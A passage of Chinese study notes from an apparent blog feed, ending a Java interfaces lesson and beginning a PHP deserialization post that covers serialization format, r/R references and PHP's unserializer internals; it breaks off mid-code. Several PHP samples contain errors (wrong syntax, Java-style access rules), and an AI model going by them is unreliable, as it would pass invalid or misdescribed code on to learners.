<span class="title function_">m2</span><span class="params">()</span>;<span class="comment">//默认public abstract</span></span><br><span class="line">    <span class="type">double</span> VERSION=<span class="number">1.0</span>;<span class="comment">//默认public static final</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubTest</span> <span class="keyword">implements</span> <span class="title class_">MyInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sub-M1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">SubTest</span> <span class="variable">sub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubTest</span>();</span><br><span class="line">        sub.m1();</span><br><span class="line"></span><br><span class="line">        <span class="type">MyInterface</span> <span class="variable">sub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubTest</span>();</span><br><span class="line">        sub.m1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub-M1  sub-M1</span></span><br></pre></td></tr></table></figure><p>与抽象类的异同：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b48c41c.png" alt="image-20240421212931162"></p><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5528ae.png" alt="image-20240421213834570"></p> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICode</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IPlay</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">IPlay</span>,ICode&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;会编码&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;弹钢琴&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    s.code();</span><br><span class="line">    s.play();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的规范"><a href="#接口的规范" class="headerlink" title="接口的规范"></a>接口的规范</h3><ul><li>任何类在实现接口时，必须实现接口中所有的抽象方法，否则此类为抽象类</li><li>实现接口中的抽象方法时，访问修饰符必须时public</li></ul><h3 id="接口引用"><a href="#接口引用" class="headerlink" title="接口引用"></a>接口引用</h3><p>同父类一样，接口也可以声明为引用，并指向实现类对象</p><p>注:</p><ul><li>仅可调用接口中声明的方法，不可调用实现类中独有的方法</li><li>可强回转实现类本身类型，进行独有方法调用</li></ul><h3 id="接口的多态"><a href="#接口的多态" class="headerlink" title="接口的多态"></a>接口的多态</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b889ddc.png" alt="image-20240421214510628"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b71f3b7.png" alt="image-20240421214617722"></p><p><strong>不同引用类型，仅可调用自身类型中所什么的方法</strong></p><h3 id="常见关系"><a href="#常见关系" class="headerlink" title="常见关系"></a>常见关系</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a4b35f781.png" alt="image-20240421214803253"></p><h3 id="常量接口"><a href="#常量接口" class="headerlink" title="常量接口"></a>常量接口</h3><p>将多个常用于表示状态或固定值的变量，以静态常量的形式定义在接口中统一管理，提高代码可读性</p><h3 id="接口表示标准"><a href="#接口表示标准" class="headerlink" title="接口表示标准"></a>接口表示标准</h3><p>接口从宏观上来讲是一种标准</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUsb</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">service</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    IUsb usb;<span class="comment">//成员变量</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsbDisk</span> <span class="keyword">implements</span> <span class="title class_">IUsb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Usb service started1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsbFan</span> <span class="keyword">implements</span> <span class="title class_">IUsb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Usb service started2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">UsbDisk</span> <span class="variable">disk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbDisk</span>();</span><br><span class="line">        <span class="type">UsbFan</span> <span class="variable">fan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbFan</span>();</span><br><span class="line">        character c=<span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        c.usb=disk;</span><br><span class="line">        c.usb.service();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Usb service started1</span></span><br></pre></td></tr></table></figure><p><strong>接口除了表示约束 表示规范 接口还表示一种标记</strong></p><h3 id="接口回调"><a href="#接口回调" class="headerlink" title="接口回调"></a>接口回调</h3><p>先有接口的使用，后有接口的实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICallback</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>;<span class="comment">//抽象方法--以后要实现的功能--留给实现类去实现</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">doCall</span><span class="params">()</span>&#123;<span class="comment">//jdk8以后 接口中可以调用默认方法（用default修饰）与静态方法</span></span><br><span class="line">        call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ICallback</span> <span class="variable">call</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">CallBack</span>();<span class="comment">//反射+注解自动寻找用户类来完成对这个类的实例化</span></span><br><span class="line">        call.doCall();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CallBack</span> <span class="keyword">implements</span> <span class="title class_">ICallback</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;call!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//call!</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>接口优势：</p><ul><li>程序的耦合度降低</li><li>更自然的使用多态</li><li>设计与实现完全分离</li><li>更容易搭建程序框架</li><li>更容易更换具体实现</li></ul><p><img src="https://bu.dusays.com/2024/05/13/6641a4b6ab0da.png" alt="image-20240421221459493"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 编程语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="面向过程"><a href="#面向过程" class="headerlink" title="面向过程"></a>面向过程</h3><p>就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了</p><p>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中按顺序调用函数</p><h3 id="面向对象-1"><a href="#面向对象-1" class="headerlink" title="面向对象"></a>面向对象</h3><p>就是把现实中的事物都抽象为“对象”。每个对象是唯一的，且都可以拥有它的属性与行为。我们就可以通过调用这些对象的方法、属性去解决问题。</p><p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成整体，是对现实世界的抽象</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>类是对一组有相同数据和相同操作的对象的定义，是对象的模板，其包含的方法和数据描述一组对象的共同行为和属性。类是在对象之上的抽象，对象则是类的具体化，是类的实例。类可有其子类，也可有其他类，形成类层次结构</p><p>类是定义了一件事物的抽象特点，它将数据的形式以这些数据上的操作封装在一起。</p><p><code>对象是具有类类型的变量，是对类的实例</code></p><p>内部构成：成员变量（属性）+成员函数（方法）</p><p>属性：定义在类内部的变量  该变量的值对外是不可见的，但是可以通过方法访问  在类被实例化后，该变量即可成为对象的属性</p><p>方法：定义在类的内部，可用于访问对象的数据</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>让某个类型的对象获得另一个类型的对象的属性和方法。继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为</p><p>父类：一个类被其他类继承，可将该类称为父类（基类、超类）</p><p>子类：一个类继承其他类，则该类被称为子类（派生类）</p><h4 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;<span class="comment">//定义类（类名）</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;<span class="comment">//声明成员变量（属性）</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>)</span>&#123;<span class="comment">//声明成员函数（方法）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;<span class="comment">//$this:调用这个类中的属性时使用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;<span class="comment">//方法传参var可直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();<span class="comment">//new:实例化对象  把他赋值为对象cyj</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;name=<span class="string">&#x27;程咬金&#x27;</span>；<span class="comment">//赋值参数</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;sex=<span class="string">&#x27;男&#x27;</span>；</span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="title function_ invoke__">jineng</span>(<span class="string">&#x27;跳跳跳&#x27;</span>);<span class="comment">//调用方法</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cyj</span>);<span class="comment">//打印</span></span><br></pre></td></tr></table></figure><h4 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h4><ul><li>public：对外公开，访问级别最高</li><li>protected：只对同一个包中的类或者子类公开</li><li>默认：只对同一个包中的类公开</li><li>private：不对外公开，只能在对象内部访问，访问级别最低<br><img src="https://img-blog.csdnimg.cn/274e6b8cc40c4c66ad93056fe6c5991b.png" alt="在这里插入图片描述"></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span> $<span class="title">this</span>-&gt;<span class="title">name</span></span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name;<span class="comment">//可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;sex;<span class="comment">//不行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;age;<span class="comment">//不行</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span> $<span class="title">this</span>-&gt;<span class="title">name</span></span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero2</span> <span class="title">extend</span> <span class="title">hero</span></span>&#123;<span class="comment">//子类</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$cyj2</span>=<span class="keyword">new</span> hero2;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name;<span class="comment">//可以</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj2</span>-&gt;<span class="title function_ invoke__">test</span>();<span class="comment">//sex不能触发</span></span><br></pre></td></tr></table></figure><p>方法也可以用修饰符</p><h2 id="序列化基础知识"><a href="#序列化基础知识" class="headerlink" title="序列化基础知识"></a>序列化基础知识</h2><p>序列化(serialization)（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ba145d.png" alt="image-20240221185603468"></p><table><thead><tr><th align="center">类型</th><th>例子</th><th>序列化结果</th></tr></thead><tbody><tr><td align="center">空字符</td><td>NULL</td><td>N；</td></tr><tr><td align="center">整型</td><td>666</td><td>i:666;</td></tr><tr><td align="center">浮点型</td><td>66.6</td><td>d:66.6;</td></tr><tr><td align="center">布朗型</td><td>true</td><td>b:1;</td></tr><tr><td align="center"></td><td>false</td><td>b:0;</td></tr><tr><td align="center">字符串</td><td>’benben‘</td><td>s:6(长度);”benben”</td></tr><tr><td align="center">数组</td><td>array(‘benben’,’laoli’)</td><td>a:2(参数数量)：{i:0(编号);s:6:”benben”;i:1;s:5:”laoli”;)}</td></tr></tbody></table><h3 id="r与R"><a href="#r与R" class="headerlink" title="r与R"></a>r与R</h3><p>当两个对象本来就是同一个对象时后出现的对象将会以小写<strong>r</strong>表示。<br>不过基础类型不受此条件限制，总是会被序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:1;&#125; // 基础类型</span></span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$y</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;O:8:&quot;stdClass&quot;:0:&#123;&#125;s:1:&quot;b&quot;;r:2;&#125;</span></span><br><span class="line"><span class="comment">// id(a) == id(b)，二者都是$y;</span></span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="variable">$x</span>; <span class="variable">$x</span>-&gt;b = <span class="variable">$x</span>;</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;r:1;s:1:&quot;b&quot;;r:1;&#125;</span></span><br></pre></td></tr></table></figure><p>而当PHP中的一个对象如果是对另一对象显式的<strong>引用</strong>，那么在同时对它们进行序列化时将通过大写<strong>R</strong>表示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>对于“同一个对象”，php直接对取出的对象引用进行了一次解引用，便将这个 <em><strong>对象</strong></em> 赋给了右值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;r:&quot;</span> uiv <span class="string">&quot;;&quot;</span>        &#123;</span><br><span class="line">    zend_long id;</span><br><span class="line">    *p = YYCURSOR;</span><br><span class="line">    <span class="keyword">if</span> (!var_hash) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    id = parse_uiv(start + <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// 待会说 var_hash ，先看下面几行</span></span><br><span class="line">    <span class="comment">// r begin</span></span><br><span class="line">    <span class="keyword">if</span> (rval_ref == rval) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    ZVAL_DEREF(rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (Z_TYPE_P(rval_ref) != IS_OBJECT) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="comment">// r end</span></span><br><span class="line">    ZVAL_COPY(rval, rval_ref);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而对于“对象引用”，其反序列化过程与上面小r非常像，不一样的地方在于 r begin 和 r end 之间：</p><p>php并没有对取出的引用进行解引用，直接将这个 <em><strong>引用</strong></em> 赋给了右值。<br>如果取出的引用本身指向的是一个引用，php还会进一步跟到引用指向的对象，创建一个新的指向对应对象的引用，赋给右值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 略</span></span><br><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"><span class="comment">// R begin</span></span><br><span class="line"><span class="keyword">if</span> (Z_ISUNDEF_P(rval_ref) || (Z_ISREF_P(rval_ref) &amp;&amp; Z_ISUNDEF_P(Z_REFVAL_P(rval_ref)))) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Z_ISREF_P(rval_ref)) &#123;</span><br><span class="line">    zend_property_info *info = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((*var_hash)-&gt;ref_props) &#123;</span><br><span class="line">        info = zend_hash_index_find_ptr((*var_hash)-&gt;ref_props, (<span class="type">zend_uintptr_t</span>)rval_ref);</span><br><span class="line">    &#125;</span><br><span class="line">    ZVAL_NEW_REF(rval_ref, rval_ref);</span><br><span class="line">    <span class="keyword">if</span> (info) &#123; ZEND_REF_ADD_TYPE_SOURCE(Z_REF_P(rval_ref), info); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// R end</span></span><br><span class="line">ZVAL_COPY(rval, rval_ref);</span><br></pre></td></tr></table></figure><p><strong>R&#x2F;r后的数字：</strong></p><p>那么，R&#x2F;r后面跟的数字是怎么决定的呢？首先我们先来“黑箱分析”一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 1</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">stdClass</span>);</span><br><span class="line"><span class="variable">$x</span>[<span class="number">1</span>] = &amp;<span class="variable">$x</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:2;&#125;               ⬇️ 注意这，变了</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:2:&#123;i:0;O:8:&quot;stdClass&quot;:0:&#123;&#125;i:1;R:1;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">/* 压缩了一下（</span></span><br><span class="line"><span class="comment">array(2) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">  [1]=&gt; array(2) &#123;</span></span><br><span class="line"><span class="comment">    [0]=&gt; object(stdClass)#2 (0) &#123;&#125;</span></span><br><span class="line"><span class="comment">    [1]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// e.g 2</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;b = &amp;<span class="variable">$x</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:2;&#125;               ⬇️ 同上</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:8:&quot;stdClass&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;R:1;&#125; &#x27;</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(stdClass)#3 (2) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;a&quot;]=&gt; int(1)</span></span><br><span class="line"><span class="comment">  [&quot;b&quot;]=&gt; *RECURSION*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>相信大家定睛看两眼上面的例子就能猜出，R&#x2F;r后面的数字指代的是在 <em><strong>同一反序列化过程中</strong></em><br>出现过的第n个非键(key)对象（我又在瞎起名字了）</p><p>看过上面的源码以后很容易猜到，在反序列化过程中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (id == <span class="number">-1</span> || (rval_ref = var_access(var_hash, id)) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>这一步正是上面取值的关键。在反序列化过程中我们看到 <code>php_var_unserialize_internal</code> 函数在一开头就进行了 <code>var_push(var_hash, rval);</code> 这样的操作（当然前提是反序列化的对象的标记不能是’R’，因为“引用”本身如果也计算在内，那么就有可能出现循环引用。浙恒河里），而 <code>var_push</code> 正是向列表 <code>var_hash</code> append一个新的元素。</p><blockquote><p><strong>其实</strong> <code>var_hash</code> <strong>并不单单是一个列表，只是本文为方便这么说罢了。</strong></p></blockquote><p>这时候就有同学要问了，数组的index是数字，对象的属性名是字符串，它们都存在于反序列化过程当中，为什么它们没有被append进 <code>var_hash</code> 呢？我们回头看一下 <code>var_push</code> 的条件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (var_hash &amp;&amp; (*p)[<span class="number">0</span>] != <span class="string">&#x27;R&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><p>后面那个’R’已经在恒河里了，那么前面那个 <code>var_hash</code> 非 NULL 的判断意义何在呢？<br>桥豆麻袋，<code>var_hash</code> 是哪里来的呢？<br><code>php_var_unserialize_internal</code> 的参数里有个宏</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNSERIALIZE_PARAMETER \</span></span><br><span class="line"><span class="meta">    zval *rval, const unsigned char **p, \</span></span><br><span class="line"><span class="meta">    const unsigned char *max, \</span></span><br><span class="line"><span class="meta">    php_unserialize_data_t *var_hash</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span>;</span><br></pre></td></tr></table></figure><p>自然而然地，我们回去看这个internal是怎么调用的，看看什么情况下传入的 <code>var_hash</code> 为 NULL：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 高度简化版</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">php_var_unserialize_internal</span><span class="params">(UNSERIALIZE_PARAMETER, <span class="type">int</span> as_key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> match <span class="string">&quot;a:&lt;arr_len&gt;&quot;</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        process_nested_data(UNSERIALIZE_PASSTHRU, ...);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> match <span 